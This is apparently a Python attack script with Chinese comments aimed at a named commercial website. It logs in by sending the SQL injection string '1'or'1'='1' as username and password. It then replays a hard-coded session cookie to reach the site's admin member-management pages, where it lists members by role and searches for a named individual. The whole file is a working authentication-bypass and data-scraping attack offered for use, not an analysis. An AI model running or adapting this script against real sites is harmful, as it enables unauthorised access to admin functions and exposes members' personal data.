#coding:UTF-8

import requests as rs
import re
import json
# post

# backurl=index.html
# json=1
# psw=333
# user=111

#请求的url
# act=dologin
# ctl=user
# json=1

# http://www.dreamtimes.com.cn/index.php?ctl=user&act=dologin&json=1&backurl=index.html&json=1&psw=333&user=111

#主页的url

###  s=requests.Session()开启会话  然后利用s   ####


url = 'http://www.dreamtimes.com.cn'
s = rs.Session()   #这个s是极其重要的，利用这个开启了s之后，可以对后续的url自动带上cookies 而不需要手动去设置
r = s.get(url)
#print(r.text)
postUrl = 'http://www.dreamtimes.com.cn/index.php?ctl=user&act=dologin&json=1&backurl=index.html'
user = "1'or'1'='1"
psw = "1'or'1'='1"
payload = {'user':user,'psw':psw}



#加盟会员 get请求加盟用户的url http://www.dreamtimes.com.cn/index.php?ctl=union&act=usermanage&p=2   请求第二个页面
# 通过url后面 &p=2 来实现

headers = {
        'Host': 'www.dreamtimes.com.cn',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://www.dreamtimes.com.cn/index.php?ctl=admin&act=members',
        'Cookie': 'Hm_lvt_bb8c9f5ba3be6afb42e81490ad6ebc1f=1447893039,1447903169,1448591796,1448592511; shops=a%3A0%3A%7B%7D; PHPSESSID=tbi9g82qm1ldlfnc318h99e931; pgv_pvi=8852263936; IESESSION=alive; pgv_si=s7261105152; Hm_lpvt_bb8c9f5ba3be6afb42e81490ad6ebc1f=1448593708',
        'Connection': 'keep-alive'
            }

result = s.post(postUrl,payload)
#print(result.cookies)

memeberUrl = 'http://www.dreamtimes.com.cn/index.php?ctl=union&act=usermanage'
result1 = s.get(memeberUrl,headers=headers)
#print(result1.text)
# 会员管理 http://www.dreamtimes.com.cn/index.php?ctl=admin&act=members
# 查询某个会员 post url  http://www.dreamtimes.com.cn/index.php?ctl=admin&act=members
memeberManage = 'http://www.dreamtimes.com.cn/index.php?ctl=admin&act=members'
### post参数
    # button2=提交
    # month=
    # roletype=-1
    # search=usr
#searchContent为搜索的关键词

headers2 = {
    'Host': 'www.dreamtimes.com.cn',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://www.dreamtimes.com.cn/index.php?ctl=admin&act=members',
    'Content-Length': 0,
    'Content-Type': 'text/plain; charset=UTF-8',
    'Cookie': 'Hm_lvt_bb8c9f5ba3be6afb42e81490ad6ebc1f=1447893039,1447903169,1448591796,1448592511; shops=a%3A0%3A%7B%7D; PHPSESSID=tbi9g82qm1ldlfnc318h99e931; pgv_pvi=8852263936; IESESSION=alive; pgv_si=s7261105152; Hm_lpvt_bb8c9f5ba3be6afb42e81490ad6ebc1f=1448593708',
    'Connection': 'keep-alive',
}

searchContent = '王傲宇'
payloadSingle = {
    'button2':'提交',
    'month':'',
    'roletype':-1,
    'search': searchContent
}

# month=
# roletype=6  校园代理   roletype=1 批发会员  roletype=2 核心经销商  roletype=5区域代理
# search=

payloadType = {
    'month':'',
    'roletype':1,
    'search': ''
}

resutl2 = s.post(memeberManage,data=payloadType)
print(resutl2.text)




